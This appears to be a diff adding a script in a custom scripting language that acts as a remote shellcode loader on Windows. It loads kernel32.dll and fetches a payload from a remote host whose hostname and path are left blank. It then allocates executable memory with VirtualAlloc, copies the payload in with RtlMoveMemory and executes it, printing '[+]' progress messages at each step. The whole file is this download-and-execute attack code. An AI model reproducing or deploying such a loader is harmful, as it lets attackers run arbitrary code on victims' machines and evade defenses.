@@ -1,0 +1,83 @@
+puts("[+] Attempting to load kernel32.dll...");
+puts("\r\n");
+
+var libKernel32 = LoadLibrary("kernel32.dll");
+DbgAddr(libKernel32);
+
+puts("[+] Load library was successful!");
+puts("\r\n");
+
+puts("[+] Fetching shellcode payload for execution...");
+puts("\r\n");
+
+var payloadHostname = "";
+var payloadPath = "";
+
+var payload = getRemoteFile(payloadHostname, payloadPath);
+var size = payload.size();
+
+puts("[+] We got the payload!");
+puts("\r\n");
+
+puts("[+] Attempting to init VirtualAlloc...");
+puts("\r\n");
+
+var allocType = 0x00001000;
+var memProtect = 0x40;
+
+var allocMem = funCall();
+allocMem.init(libKernel32, "VirtualAlloc", 2);
+
+puts("[+] We init the function for VirtualAlloc!");
+puts("\r\n");
+
+puts("[+] Attempting to execute VirtualAlloc...");
+puts("\r\n");
+
+allocMem.argUInt64(0);
+allocMem.argUInt64(size);
+allocMem.argUInt64(allocType);
+allocMem.argUInt64(memProtect);
+
+var allocAddr = allocMem.evalUInt64();
+
+puts("[+] VirtualAlloc was successful! Memory allocated at: ");
+puts(allocAddr);
+puts("\r\n");
+
+puts("[+] Attempting to init RtlMoveMemory...");
+puts("\r\n");
+
+var moveMem = funCall();
+moveMem.init(libKernel32, "RtlMoveMemory", 2);
+
+puts("[+] We init the function for RtlMoveMemory!");
+puts("\r\n");
+
+puts("[+] Attempting to execute RtlMoveMemory...");
+puts("\r\n");
+
+moveMem.argUInt64(allocAddr);
+moveMem.argUInt64(uintPtr(payload));
+moveMem.argUInt64(size);
+
+moveMem.evalUInt64();
+
+puts("[+] We moved the memory!");
+puts("\r\n");
+
+puts("[+] Converting memory address from int to void pointer and assigning...");
+puts("\r\n");
+
+convertAddrAndAssign(allocAddr);
+
+puts("[+] Conversion and assignment successful!");
+puts("\r\n");
+
+puts("[+] Attempting to execute shellcode...");
+puts("\r\n");
+
+executeMemory();
+
+puts("[+] All done!");
+puts("\r\n");
